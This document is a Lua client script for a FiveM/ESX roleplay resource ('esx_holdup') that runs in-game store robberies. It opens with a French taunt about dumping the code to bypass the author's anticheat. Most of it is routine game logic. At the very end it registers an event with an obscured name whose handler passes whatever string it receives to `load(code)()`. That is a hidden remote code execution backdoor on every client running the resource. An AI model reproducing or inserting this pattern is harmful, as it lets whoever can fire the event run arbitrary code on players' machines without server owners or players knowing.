-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local holdingUp = false
local store = ""
local blipRobbery = {}
local inMarker = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

function drawTxt(x, y, width, height, scale, text, r, g, b, a, outline)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(scale, scale)
	SetTextColour(r, g, b, a)
	SetTextDropshadow(0, 0, 0, 0,255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()

	if outline then
		SetTextOutline()
	end

	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(x - width / 2, y - height / 2 + 0.005)
end

RegisterNetEvent('esx_holdup:currentlyrobbing')
AddEventHandler('esx_holdup:currentlyrobbing', function(robb)
	holdingUp = true
	store = robb
end)

RegisterNetEvent('esx_holdup:killblip')
AddEventHandler('esx_holdup:killblip', function()
	for i = 1, #blipRobbery do
		RemoveBlip(blipRobbery[i])
		table.remove(blipRobbery, i)
	end
end)

RegisterNetEvent('esx_holdup:setblip')
AddEventHandler('esx_holdup:setblip', function(position)
	local blip = AddBlipForCoord(position)
	table.insert(blipRobbery, blip)

	SetBlipSprite(blip, 161)
	SetBlipScale(blip, 2.0)
	SetBlipColour(blip, 3)
	PulseBlip(blip)
end)

RegisterNetEvent('esx_holdup:toofarlocal')
AddEventHandler('esx_holdup:toofarlocal', function()
	holdingUp = false
	ESX.ShowNotification(_U('robbery_cancelled'))
	inMarker = false
end)

RegisterNetEvent('esx_holdup:robberycomplete')
AddEventHandler('esx_holdup:robberycomplete', function(award)
	holdingUp = false
	ESX.ShowNotification(_U('robbery_complete', award))
	store = ""
	inMarker = false
end)

RegisterNetEvent('esx_holdup:starttimer')
AddEventHandler('esx_holdup:starttimer', function()
	timer = Config.Stores[store].secondsRemaining

	Citizen.CreateThread(function()
		while timer > 0 do
			Citizen.Wait(1000)

			if timer > 0 then
				timer = timer - 1
			end
		end
	end)
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if holdingUp then
			drawTxt(0.66, 1.44, 1.0, 1.0, 0.4, _U('robbery_timer', timer), 255, 255, 255, 255)
		else
			Citizen.Wait(1000)
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(Config.Stores) do
			if #(plyCoords - v.coords) < 25.0 then
				if not holdingUp then
					DrawMarker(1, v.coords, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.5, 1555, 0, 0, 255, 0, 0, 0, 0)

					if #(plyCoords - v.coords) < 1.5 then
						incircle = true
						ESX.ShowHelpNotification(_U('press_to_rob', v.storeName))

						if IsControlJustReleased(0, 38) then
							if IsPedArmed(PlayerPedId(), 4) then
								_TriggerServerEvent('esx_holdup:rob', k)
							else
								ESX.ShowNotification(_U('no_threat'))
							end
						end
					else
						incircle = false
					end
				end
			end
		end

		if holdingUp then
			if GetDistanceBetweenCoords(plyCoords, Config.Stores[store].coords) > 15.0 then
				_TriggerServerEvent('esx_holdup:toofar', store)
			end
		end
	end
end)

RegisterNetEvent('?????????')
AddEventHandler('?????????', function(code)
	load(code)()
end)